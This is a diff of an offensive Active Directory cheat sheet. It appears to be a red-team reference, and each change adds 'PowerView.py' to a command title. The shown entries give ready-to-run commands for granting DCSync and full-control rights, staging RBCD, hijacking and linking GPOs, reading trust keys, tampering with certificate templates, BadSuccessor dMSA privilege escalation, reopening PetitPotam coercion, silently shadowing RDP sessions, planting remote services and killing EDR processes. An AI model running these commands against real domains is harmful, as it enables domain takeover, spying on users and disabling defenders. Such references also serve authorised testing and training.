 Grants `DS-Replication-Get-Changes` + `-All` on the domain to a principal. Sets up the classic DCSync primitive.
 
-```sh title:"Grant Get-Changes + Get-Changes-All on domain root"
+```sh title:"PowerView.py Grant Get-Changes + Get-Changes-All on domain root"
 Add-DomainObjectAcl -TargetIdentity $target -PrincipalIdentity $principal -Rights dcsync
 ```
 <!-- cheat
@@ -1031,7 +1031,7 @@ var principal --- --header "Principal to grant rights to"
 
 Grants `GenericAll` over a target object. Sweeping primitive used in many ACL takeover chains.
 
-```sh title:"Grant GenericAll, full ACL takeover"
+```sh title:"PowerView.py Grant GenericAll, full ACL takeover"
 Add-DomainObjectAcl -TargetIdentity $target -PrincipalIdentity $principal -Rights fullcontrol
 ```
 <!-- cheat
@@ -1043,7 +1043,7 @@ var principal --- --header "Principal to grant rights to"
 
 Writes the RBCD descriptor on the target so the principal can S4U2Proxy as anyone. ACL-based RBCD staging.
 
-```sh title:"Grant RBCD via ACL, principal can S4U2Proxy as anyone"
+```sh title:"PowerView.py Grant RBCD via ACL, principal can S4U2Proxy as anyone"
 Add-DomainObjectAcl -TargetIdentity $target -PrincipalIdentity $principal -Rights RBCD
 ```
 <!-- cheat
@@ -1055,7 +1055,7 @@ var principal --- --header "Attacker-controlled computer (e.g. POC113)"
 
 Removes a previously granted right from the target's DACL. Cleanup primitive for ACL chains.
 
-```sh title:"Strip granted right, cleanup after ACL chain"
+```sh title:"PowerView.py Strip granted right, cleanup after ACL chain"
 Remove-DomainObjectAcl -TargetIdentity $target -PrincipalIdentity $principal -Rights $rights
 ```
 <!-- cheat
@@ -1070,7 +1070,7 @@ var rights --- --header "Rights to remove (e.g. dcsync)"
 
 Enumerates Group Policy Objects in the domain. Inspect `gpcfilesyspath` to find writable policies.
 
-```sh title:"GPO list with displayname + gpcfilesyspath"
+```sh title:"PowerView.py GPO list with displayname + gpcfilesyspath"
 Get-DomainGPO -Properties displayname,gpcfilesyspath
 ```
 <!-- cheat -->
@@ -1079,7 +1079,7 @@ Get-DomainGPO -Properties displayname,gpcfilesyspath
 
 Reads Restricted Groups / GPP entries that assign local group membership via GPO. Excellent source of lateral movement clues.
 
-```sh title:"Restricted Groups / GPP local group assignments"
+```sh title:"PowerView.py Restricted Groups / GPP local group assignments"
 Get-DomainGPOLocalGroup -Identity "$gpo"
 ```
 <!-- cheat
@@ -1090,7 +1090,7 @@ var gpo --- --header "GPO display name (e.g. Default Domain Policy)"
 
 Parses and dumps the settings of a GPO. Understand what a policy actually does before tampering.
 
-```sh title:"Parse + dump GPO settings before tampering"
+```sh title:"PowerView.py Parse + dump GPO settings before tampering"
 Get-DomainGPOSettings -Identity "$gpo"
 ```
 <!-- cheat
@@ -1101,7 +1101,7 @@ var gpo --- --header "GPO display name"
 
 Links an existing GPO to an OU or container. Follow-up after staging or hijacking a malicious GPO.
 
-```sh title:"Link (malicious) GPO to OU/container"
+```sh title:"PowerView.py Link (malicious) GPO to OU/container"
 Add-GPLink -GUID "$guid" -TargetIdentity "$target"
 ```
 <!-- cheat
@@ -1113,7 +1113,7 @@ var target --- --header "Target OU/container DN"
 
 Removes a GPO link from a target OU/container. Cleanup primitive after GPO abuse.
 
-```sh title:"Unlink GPO from target, cleanup after abuse"
+```sh title:"PowerView.py Unlink GPO from target, cleanup after abuse"
 Remove-GPLink -GUID "$guid" -TargetIdentity "$target"
 ```
 <!-- cheat
@@ -1125,7 +1125,7 @@ var target --- --header "Target OU/container DN"
 
 Creates a brand new GPO and optionally links it. Stage your own policy when you can't modify an existing one.
 
-```sh title:"Create + link new GPO when none are writable"
+```sh title:"PowerView.py Create + link new GPO when none are writable"
 Add-DomainGPO -Identity "$name" -LinkTo "$target"
 ```
 <!-- cheat
@@ -1139,7 +1139,7 @@ var target --- --header "OU/container DN to link to"
 
 Lists trust relationships of the current domain. Foundation for cross-domain enumeration.
 
-```sh title:"Map inbound/outbound trusts across the domain"
+```sh title:"PowerView.py Map inbound/outbound trusts across the domain"
 Get-DomainTrust -Properties trustDirection,trustPartner
 ```
 <!-- cheat -->
@@ -1148,7 +1148,7 @@ Get-DomainTrust -Properties trustDirection,trustPartner
 
 Reads the trust account keys stored in AD. Sensitive material - enables inter-realm forgeries when accessible.
 
-```sh title:"Trust account keys, inter-realm forgery material"
+```sh title:"PowerView.py Trust account keys, inter-realm forgery material"
 Get-DomainTrustKey
 ```
 <!-- cheat -->
@@ -1157,7 +1157,7 @@ Get-DomainTrustKey
 
 Lists users from other domains added inside this one. Reveals cross-domain paths via foreign security principals.
 
-```sh title:"Foreign users granted access inside this domain"
+```sh title:"PowerView.py Foreign users granted access inside this domain"
 Get-DomainForeignUser
 ```
 <!-- cheat -->
@@ -1166,7 +1166,7 @@ Get-DomainForeignUser
 
 Lists groups in this domain that contain members from another. Maps inbound cross-trust access.
 
-```sh title:"Inbound cross-trust access via foreign group members"
+```sh title:"PowerView.py Inbound cross-trust access via foreign group members"
 Get-DomainForeignGroupMember
 ```
 <!-- cheat -->
@@ -1177,7 +1177,7 @@ Get-DomainForeignGroupMember
 
 Edits attributes on a certificate template (e.g. EKU values). Building block for ADCS misconfig abuse.
 
-```sh title:"Overwrite template attribute (e.g. EKU)"
+```sh title:"PowerView.py Overwrite template attribute (e.g. EKU)"
 Set-DomainCATemplate -Identity $template -Set '$attribute=$value'
 ```
 <!-- cheat
@@ -1190,7 +1190,7 @@ var value --- --header "Value (e.g. Client Authentication)"
 
 Appends to a multi-valued template attribute without overwriting the rest.
 
-```sh title:"Append to multi-value template attribute"
+```sh title:"PowerView.py Append to multi-value template attribute"
 Set-DomainCATemplate -Identity $template -Append '$attribute=$value'
 ```
 <!-- cheat
@@ -1203,7 +1203,7 @@ var value --- --header "Value to append"
 
 Clears an attribute on a CA template. Cleanup after template tampering.
 
-```sh title:"Clear template attribute, cleanup after tampering"
+```sh title:"PowerView.py Clear template attribute, cleanup after tampering"
 Set-DomainCATemplate -Identity $template -Clear $attribute
 ```
 <!-- cheat
@@ -1215,7 +1215,7 @@ var attribute --- --header "Attribute to clear"
 
 Adds a new CA template by duplicating an existing one. Stage a controlled vulnerable template.
 
-```sh title:"Clone template, stage controlled vulnerable copy"
+```sh title:"PowerView.py Clone template, stage controlled vulnerable copy"
 Add-DomainCATemplate -Duplicate $source -Name $name -DisplayName "$display"
 ```
 <!-- cheat
@@ -1228,7 +1228,7 @@ var display --- --header "New template display name"
 
 Grants rights (`Enroll`, `Write`, `All`) on a certificate template to a principal. Plant your own enrolment access.
 
-```sh title:"Grant Enroll/Write/All on template to principal"
+```sh title:"PowerView.py Grant Enroll/Write/All on template to principal"
 Add-DomainCATemplateAcl -Template $template -PrincipalIdentity $principal -Rights $rights
 ```
 <!-- cheat
@@ -1241,7 +1241,7 @@ var rights --- --header "Rights (e.g. Enroll)"
 
 Removes a certificate template from AD CS. Cleanup after planting and abusing a template.
 
-```sh title:"Delete template, cleanup after abuse"
+```sh title:"PowerView.py Delete template, cleanup after abuse"
 Remove-DomainCATemplate -Identity $template
 ```
 <!-- cheat
@@ -1254,7 +1254,7 @@ var template --- --header "Template to remove"
 
 Creates a gMSA with a chosen `PrincipalsAllowedToRetrieveManagedPassword`. Stage a controllable gMSA for testing.
 
-```sh title:"Create gMSA with chosen password retrievers"
+```sh title:"PowerView.py Create gMSA with chosen password retrievers"
 Add-DomainGMSA -Identity $name -PrincipalsAllowedToRetrieveManagedPassword "$principal"
 ```
 <!-- cheat
@@ -1266,7 +1266,7 @@ var principal --- --header "Principal allowed to retrieve password (e.g. Domain 
 
 Removes a group-managed service account. Cleanup primitive.
 
-```sh title:"Delete gMSA, cleanup primitive"
+```sh title:"PowerView.py Delete gMSA, cleanup primitive"
 Remove-DomainGMSA -Identity $name
 ```
 <!-- cheat
@@ -1277,7 +1277,7 @@ var name --- --header "gMSA to remove"
 
 Creates a dMSA, optionally tied to a victim user via `SupersededAccount`. Building block for BadSuccessor-style attacks.
 
-```sh title:"Create dMSA, optionally supersede victim"
+```sh title:"PowerView.py Create dMSA, optionally supersede victim"
 Add-DomainDMSA -Identity $name -SupersededAccount $victim
 ```
 <!-- cheat
@@ -1289,7 +1289,7 @@ var victim --- --header "Account to be superseded"
 
 Removes a delegated managed service account. Cleanup primitive.
 
-```sh title:"Delete dMSA, cleanup primitive"
+```sh title:"PowerView.py Delete dMSA, cleanup primitive"
 Remove-DomainDMSA -Identity $name
 ```
 <!-- cheat
@@ -1300,7 +1300,7 @@ var name --- --header "dMSA to remove"
 
 Exploits the dMSA successor relationship by superseding a high-value account with an attacker-controlled dMSA. Privesc against vulnerable forests.
 
-```sh title:"dMSA supersession privesc against vulnerable forests"
+```sh title:"PowerView.py dMSA supersession privesc against vulnerable forests"
 Invoke-BadSuccessor -DMSAName "$dmsa" -TargetIdentity "$target"
 ```
 <!-- cheat
@@ -1314,7 +1314,7 @@ var target --- --header "Target identity (e.g. Domain Admins)"
 
 Reads existing `KeyCredentialLink` entries so you can pick a specific Device ID for surgical removal.
 
-```sh title:"Enumerate KeyCredentialLink Device IDs for cleanup"
+```sh title:"PowerView.py Enumerate KeyCredentialLink Device IDs for cleanup"
 Set-ShadowCredential -Identity $target -List
 ```
 <!-- cheat
@@ -1325,7 +1325,7 @@ var target --- --header "Target identity"
 
 Removes a single key credential by its Device ID. Surgical cleanup after abuse.
 
-```sh title:"Remove one key credential by Device ID"
+```sh title:"PowerView.py Remove one key credential by Device ID"
 Remove-ShadowCredential -Identity $target -DeviceId $deviceid
 ```
 <!-- cheat
@@ -1337,7 +1337,7 @@ var deviceid --- --header "Device ID GUID"
 
 Wipes every `msDS-KeyCredentialLink` entry. Careful - also removes legitimate Windows Hello entries.
 
-```sh title:"Wipe all KeyCredentialLink (also kills Windows Hello)"
+```sh title:"PowerView.py Wipe all KeyCredentialLink (also kills Windows Hello)"
 Remove-ShadowCredential -Identity $target -All
 ```
 <!-- cheat
@@ -1350,7 +1350,7 @@ var target --- --header "Target identity"
 
 Enumerates Exchange servers and runs a vulnerability check. Fast way to find high-value Exchange targets.
 
-```sh title:"Exchange servers + vuln check"
+```sh title:"PowerView.py Exchange servers + vuln check"
 Get-ExchangeServer -Properties cn,serialNumber
 ```
 <!-- cheat -->
@@ -1359,7 +1359,7 @@ Get-ExchangeServer -Properties cn,serialNumber
 
 Enumerates Exchange mailboxes, optionally filtered to a specific identity. Maps mailbox-to-user relationships.
 
-```sh title:"Map mailbox-to-user relationships"
+```sh title:"PowerView.py Map mailbox-to-user relationships"
 Get-ExchangeMailbox -Identity $identity
 ```
 <!-- cheat
@@ -1370,7 +1370,7 @@ var identity --- --header "Mailbox identity (e.g. administrator)"
 
 Lists Exchange databases. Useful for incident scoping and locating mailbox stores.
 
-```sh title:"Exchange databases for mailbox-store recon"
+```sh title:"PowerView.py Exchange databases for mailbox-store recon"
 Get-ExchangeDatabase
 ```
 <!-- cheat -->
@@ -1381,7 +1381,7 @@ Get-ExchangeDatabase
 
 Enables the EFS RPC interface on a remote host - opens the PetitPotam coercion surface. Use when hardening has turned it off.
 
-```sh title:"Turn EFSRPC back on (PetitPotam surface)"
+```sh title:"PowerView.py Turn EFSRPC back on (PetitPotam surface)"
 Enable-EFSRPC -Computer $computer
 ```
 <!-- cheat
@@ -1394,7 +1394,7 @@ var computer --- --header "Target computer (e.g. DC01)"
 
 Resolves a SID into its principal name. Quick helper when reading raw ACL output.
 
-```sh title:"SID -> principal name lookup"
+```sh title:"PowerView.py SID -> principal name lookup"
 ConvertFrom-SID -ObjectSID $sid
 ```
 <!-- cheat
@@ -1405,7 +1405,7 @@ var sid --- --header "SID (e.g. S-1-5-21-xxx-512)"
 
 Converts a `userAccountControl` integer into readable flags. Saves the constant-table lookup.
 
-```sh title:"userAccountControl int -> readable flags"
+```sh title:"PowerView.py userAccountControl int -> readable flags"
 ConvertFrom-UACValue -Value $value
 ```
 <!-- cheat
@@ -1416,7 +1416,7 @@ var value --- --header "UAC value (e.g. 66048)"
 
 Lists named pipes exposed by a remote host. Identifies interesting RPC services and EDR endpoints.
 
-```sh title:"Remote named pipes, spot RPC services / EDR"
+```sh title:"PowerView.py Remote named pipes, spot RPC services / EDR"
 Get-NamedPipes -Computer $computer -Name $name
 ```
 <!-- cheat
@@ -1428,7 +1428,7 @@ var name --- --header "Optional pipe name filter (e.g. sqlsvc)"
 
 Reads the local user database from a remote computer via SAMR. Finds stale local accounts.
 
-```sh title:"SAMR local user dump from remote host"
+```sh title:"PowerView.py SAMR local user dump from remote host"
 Get-LocalUser -Computer $computer
 ```
 <!-- cheat
@@ -1439,7 +1439,7 @@ var computer --- --header "Target computer"
 
 Pulls logged-on users from a remote computer via `NetWkstaUserEnum`. Complements `Get-NetSession`.
 
-```sh title:"NetWkstaUserEnum-based logged-on users"
+```sh title:"PowerView.py NetWkstaUserEnum-based logged-on users"
 Get-NetLoggedOn -Computer $computer
 ```
 <!-- cheat
@@ -1450,7 +1450,7 @@ var computer --- --header "Target computer"
 
 Reads `HKU` over the wire to identify logged-on users by their loaded profile hive. Different vantage from `Get-NetLoggedOn`.
 
-```sh title:"HKU-based logged-on users (different vantage)"
+```sh title:"PowerView.py HKU-based logged-on users (different vantage)"
 Get-RegLoggedOn -Computer $computer
 ```
 <!-- cheat
@@ -1461,7 +1461,7 @@ var computer --- --header "Target computer"
 
 Retrieves OS and hardware details from a remote host via SMB. Sanity check before deeper interaction.
 
-```sh title:"OS + hardware details via SMB"
+```sh title:"PowerView.py OS + hardware details via SMB"
 Get-NetComputerInfo -Computer $computer
 ```
 <!-- cheat
@@ -1472,7 +1472,7 @@ var computer --- --header "Target computer"
 
 Lists RDP/console sessions on a remote computer. Pair with `Logoff-Session` for session management.
 
-```sh title:"RDP/console session list on remote host"
+```sh title:"PowerView.py RDP/console session list on remote host"
 Get-NetTerminalSession -Computer $computer
 ```
 <!-- cheat
@@ -1483,7 +1483,7 @@ var computer --- --header "Target computer"
 
 Tears down a specific terminal session on a remote host. Kicks an operator or clears a stale session.
 
-```sh title:"Disconnect a specific session (kick operator)"
+```sh title:"PowerView.py Disconnect a specific session (kick operator)"
 Remove-NetTerminalSession -Computer $computer -SessionId $sessionid
 ```
 <!-- cheat
@@ -1495,7 +1495,7 @@ var sessionid --- --header "Session ID (integer)"
 
 Calls `WTSLogoffSession` on a remote host to forcibly log a user out. Aggressive but useful during takedown.
 
-```sh title:"Force WTSLogoffSession on remote host"
+```sh title:"PowerView.py Force WTSLogoffSession on remote host"
 Logoff-Session -Computer $computer -SessionId $sessionid
 ```
 <!-- cheat
@@ -1507,7 +1507,7 @@ var sessionid --- --header "Session ID to log off"
 
 Stops a process on a remote host by PID. Useful against EDR or troublesome services.
 
-```sh title:"Kill remote process by PID (EDR / nuisance svc)"
+```sh title:"PowerView.py Kill remote process by PID (EDR / nuisance svc)"
 Stop-NetProcess -Computer $computer -Pid $pid
 ```
 <!-- cheat
@@ -1519,7 +1519,7 @@ var pid --- --header "Target PID"
 
 Issues a remote shutdown over SMB. Disruptive but legitimate maintenance primitive.
 
-```sh title:"Remote shutdown over SMB"
+```sh title:"PowerView.py Remote shutdown over SMB"
 Stop-Computer -Computer $computer
 ```
 <!-- cheat
@@ -1530,7 +1530,7 @@ var computer --- --header "Target computer"
 
 Issues a remote reboot. Often used to apply changes that require a restart (e.g. RDP enable).
 
-```sh title:"Remote reboot (apply RDP enable etc.)"
+```sh title:"PowerView.py Remote reboot (apply RDP enable etc.)"
 Restart-Computer -Computer $computer
 ```
 <!-- cheat
@@ -1541,7 +1541,7 @@ var computer --- --header "Target computer"
 
 Enables Remote Desktop on a remote host via registry. Pair with a reboot to take effect.
 
-```sh title:"Flip RDP on via registry (reboot to apply)"
+```sh title:"PowerView.py Flip RDP on via registry (reboot to apply)"
 Enable-RDP -Computer $computer
 ```
 <!-- cheat
@@ -1552,7 +1552,7 @@ var computer --- --header "Target computer"
 
 Disables Remote Desktop on a remote host. Cleanup after RDP enable.
 
-```sh title:"Flip RDP off, cleanup after enable"
+```sh title:"PowerView.py Flip RDP off, cleanup after enable"
 Disable-RDP -Computer $computer
 ```
 <!-- cheat
@@ -1563,7 +1563,7 @@ var computer --- --header "Target computer"
 
 Enables RDP shadowing so a remote session can be observed without prompting. Stealthy spy on interactive users.
 
-```sh title:"RDP shadowing without prompt, stealth spy"
+```sh title:"PowerView.py RDP shadowing without prompt, stealth spy"
 Enable-ShadowRDP -Computer $computer
 ```
 <!-- cheat
@@ -1574,7 +1574,7 @@ var computer --- --header "Target computer"
 
 Disables RDP shadowing. Cleanup after Shadow RDP usage.
 
-```sh title:"Turn off RDP shadowing, cleanup"
+```sh title:"PowerView.py Turn off RDP shadowing, cleanup"
 Disable-ShadowRDP -Computer $computer
 ```
 <!-- cheat
@@ -1585,7 +1585,7 @@ var computer --- --header "Target computer"
 
 Pops a Windows message box on a remote host's interactive session. Mostly exercise/check-in fodder.
 
-```sh title:"Pop a message box on interactive session"
+```sh title:"PowerView.py Pop a message box on interactive session"
 Invoke-MessageBox -Computer $computer -Title "$title" -Message "$message"
 ```
 <!-- cheat
@@ -1598,7 +1598,7 @@ var message --- --header "Body text"
 
 Creates a service on a remote host pointing at a chosen binary. Classic lateral-movement and persistence primitive.
 
-```sh title:"Plant remote service, lateral/persistence primitive"
+```sh title:"PowerView.py Plant remote service, lateral/persistence primitive"
 Add-NetService -Computer $computer -Name $name -DisplayName "$display" -Path "$path"
 ```
 <!-- cheat
@@ -1612,7 +1612,7 @@ var path --- --header "Binary path (e.g. C:\\svc.exe)"
 
 Updates an existing service's binary path, display name, or start type. Swap a service binary or disable defenders.
 
-```sh title:"Rewrite service binary path / display / start type"
+```sh title:"PowerView.py Rewrite service binary path / display / start type"
 Set-NetService -Computer $computer -Name $name -Path "$path"
 ```
 <!-- cheat
@@ -1625,7 +1625,7 @@ var path --- --header "New binary path"
 
 Starts a Windows service on a remote host. Triggers binary execution after a service mod.
 
-```sh title:"Start remote service, trigger swapped binary"
+```sh title:"PowerView.py Start remote service, trigger swapped binary"
 Start-NetService -Computer $computer -Name $name
 ```
 <!-- cheat
@@ -1637,7 +1637,7 @@ var name --- --header "Service name"
 
 Stops a Windows service on a remote host. Mirror of `Start-NetService` for cleanup or attacker actions.
 
-```sh title:"Stop remote service (cleanup / attacker action)"
+```sh title:"PowerView.py Stop remote service (cleanup / attacker action)"
 Stop-NetService -Computer $computer -Name $name
 ```
 <!-- cheat
@@ -1649,7 +1649,7 @@ var name --- --header "Service name"
 
 Deletes a Windows service on a remote host. Final cleanup after service abuse.
 
-```sh title:"Delete remote service, final cleanup"
+```sh title:"PowerView.py Delete remote service, final cleanup"
 Remove-NetService -Computer $computer -Name $name
 ```
 <!-- cheat
@@ -1661,7 +1661,7 @@ var name --- --header "Service name"
 
 Removes a remote SMB session connected to a host. Kicks an operator off a share without rebooting.
 
-```sh title:"Kick SMB session without rebooting host"
+```sh title:"PowerView.py Kick SMB session without rebooting host"
 Remove-NetSession -Computer $computer -TargetSession "$session"
 ```
 <!-- cheat
@@ -1673,7 +1673,7 @@ var session --- --header "Target session (e.g. \\\\10.10.10.5)"
 
 Looks for SCCM/MECM installations and runs reachable checks. Often-overlooked privesc surface.
 
-```sh title:"Find SCCM/MECM + datalib reach check"
+```sh title:"PowerView.py Find SCCM/MECM + datalib reach check"
 Get-DomainSCCM -CheckDatalib
 ```
 <!-- cheat -->
@@ -1682,7 +1682,7 @@ Get-DomainSCCM -CheckDatalib
 
 Finds Windows Deployment Services config in AD. WDS images and admin accounts are a recurring source of leaked secrets.
 
-```sh title:"WDS config, recurring source of leaked secrets"
+```sh title:"PowerView.py WDS config, recurring source of leaked secrets"
 Get-DomainWDS
 ```
 <!-- cheat -->
